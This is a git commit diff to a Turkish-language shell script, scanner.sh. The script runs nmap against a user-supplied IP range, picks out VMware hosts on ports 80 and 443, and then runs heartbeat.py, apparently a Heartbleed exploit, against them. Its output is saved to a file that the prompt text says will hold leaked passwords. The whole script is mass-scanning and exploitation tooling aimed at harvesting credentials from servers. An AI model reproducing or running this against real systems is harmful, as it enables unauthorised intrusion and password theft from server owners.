47ec8ab3832bcd5a99d708fe77d9d35c7a1ca135
Cyber JUNIOR <serhatgoksu@gmail.com>
2016-11-25 23:53:40 +0200

    Update scanner.sh

--- scanner.sh
+++ scanner.sh
@@ -32,8 +32,8 @@ if [ $UID -ne 0 ]; then
  	exit
     fi
 
-print "Taramak istediğiniz ip aralığını giriniz. Örn: 1.2.0.0/16 - 1.2.3.0/24\n" "red" 
-print "IP ARALIĞI = " "red" 
+print "Taramak istediğiniz ip yada ip aralığını giriniz. Örn: 1.2.3.4 - 1.2.3.0/24\n" "red" 
+print "IP = " "red" 
 read IP_RANGE
 echo -e "
 \033[31m#######################################################\033[m
@@ -41,21 +41,32 @@ echo -e "
 \033[31m#######################################################\033[m"
 nmap -sV -p 80,443 $IP_RANGE -oA output
 
+print "VMware Sunucu IP'leri hangi isimle kayıt edilsin?\n" "red" 
+print "Dosya adı = " "red" 
+read VMwareServers
 
+print "Exploit edilebilir IP'lerden çıkacak olan data hangi isimle kayıt edilsin. (Düşen şifreler bu dosyadan bulunabilir.)\n" "red" 
+print "Dosya adı = " "red" 
+read VulnData
 
-cat output.gnmap | grep open | grep VMware | cut -d: -f2 | awk '{ print $1}' > VMwareServers
+cat output.gnmap | grep open | grep VMware | cut -d: -f2 | awk '{ print $1}' > $VMwareServers
 
 echo -e "
 \033[31m#######################################################\033[m
-		İŞLEM TAMAMLANDI. IP'LERİN YER ALDIĞI DOSYA 
-	VMwareServers ADI İLE BULUNDUĞUNUZ KLASORE KAYIT EDİLDİ.
-\033[31m#######################################################\033[m
-                		ÇIKIŞ YAPILIYOR...
+   TARAMA TAMAMLANDI. IP'LERİN YER ALDIĞI DOSYA 
+ VMwareServers ADI İLE BULUNDUĞUNUZ KLASORE KAYIT EDİLDİ.
 \033[31m#######################################################\033[m"
 
-sleep 3
-exit
+python heartbeat.py $ip -p 443 -f $VMwareServers -n 50 > $VulnData.txt 
 
+
+echo -e "
+\033[31m#######################################################\033[m
+          İŞLEM TAMAMLANDI ÇIKIŞ YAPILIYOR...
+\033[31m#######################################################\033[m"
+
+sleep 120
+exit
 
 
 
